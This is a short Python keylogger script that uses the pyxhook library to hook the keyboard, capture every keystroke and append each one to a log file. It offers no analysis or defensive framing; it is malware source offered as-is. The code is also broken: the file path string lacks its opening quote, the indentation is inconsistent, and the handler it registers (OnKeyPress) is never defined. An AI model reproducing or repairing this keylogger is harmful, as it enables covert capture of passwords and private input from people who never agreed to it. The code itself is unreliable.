import pyxhook
file_log=/home/rejah/Desktop/file.log'
def OnKeyboardEvent(event):
	k = event.Key
  
    if k == "space": k = " "
   
  	with open(file_log, 'a+') as keylogging:
      keylogging.write('%s\n' % k)  
 
#instantiate HookManager class
hooks_manager = pyxhook.HookManager()

#listen to all keystrokes
hooks_manager.KeyDown=OnKeyPress

#hook the keyboard
hooks_manager.HookKeyboard()

#start the session
hooks_manager.start()